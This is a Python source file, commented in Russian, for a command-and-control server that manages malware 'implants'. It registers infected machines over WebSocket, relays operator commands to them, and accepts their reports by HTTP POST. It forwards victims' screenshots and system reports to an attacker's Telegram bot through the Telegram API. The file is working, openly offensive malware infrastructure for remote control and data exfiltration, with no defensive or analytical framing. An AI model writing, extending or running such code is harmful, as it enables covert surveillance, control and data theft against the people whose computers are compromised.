# --- ФАЙЛ: c2_server.py (Финальная версия с отправкой SysInfo в ТГ) ---
# Исправлена логика: сервер теперь отправляет и скриншоты, и системные отчеты в Telegram.

import asyncio, json, os, threading, base64, urllib.parse
import requests
from aiohttp import web
import settings

# --- Глобальные переменные ---
IMPLANTS, OPERATOR = {}, None

def send_telegram_message(message):
    """Отправляет текстовое сообщение в Telegram."""
    def send():
        try:
            # URL-кодируем сообщение для безопасной передачи
            text = urllib.parse.quote_plus(message)
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={text}"
            requests.get(url, timeout=10)
        except Exception as e:
            print(f"[!] Ошибка отправки сообщения в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

def send_telegram_photo(caption, photo_data):
    """Отправляет base64 изображение в Telegram."""
    def send():
        try:
            image_bytes = base64.b64decode(photo_data)
            files = {'photo': ('screenshot.jpg', image_bytes, 'image/jpeg')}
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendPhoto"
            data = {'chat_id': settings.CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=20)
        except Exception as e:
            print(f"[!] Ошибка отправки фото в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        bot_list = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list})

async def report_handler(request):
    """Принимает донесения от имплантов по HTTP POST."""
    try:
        data = await request.json()
        bot_id = data.get('bot_id')
        print(f"[+] Получен отчет от {bot_id} (тип: {data.get('type')})")

        report_type = data.get('type')
        report_data = data.get('data')

        # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ: НОВЫЙ ПУНКТ В УСТАВЕ >>>
        if report_type == 'screenshot_result' and report_data:
            send_telegram_photo(f"📸 Скриншот от {bot_id}", report_data)

        elif report_type == 'status' and report_data and "СИСТЕМНЫЙ ОТЧЕТ" in report_data:
            # Формируем красивое сообщение для Telegram
            telegram_message = f"ℹ️ Инфо о системе от {bot_id}\n\n{report_data}"
            send_telegram_message(telegram_message)

        if OPERATOR and not OPERATOR.closed:
            await OPERATOR.send_json(data)

        return web.Response(status=200)
    except Exception:
        return web.Response(status=500)

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)
    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=30.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator': OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
        elif client_type == 'implant' and 'id' in initial_msg: client_id = initial_msg.get('id'); IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
        else: await ws.close(); return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                try: data = json.loads(msg.data)
                except: continue
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
                        await IMPLANTS[target_id].send_json(data)

    except Exception: pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]; print(f"[-] Имплант отключился: {client_id}"); await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None; print("[-] Оператор отключился.")
    return ws

async def http_handler(request):
    # Путь к файлу index.html, который лежит рядом с сервером
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)
app.router.add_post('/report', report_handler)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print(f"====== C2 SERVER (Крепость) ONLINE на порту {port} ======")
    web.run_app(app, host='0.0.0.0', port=port)
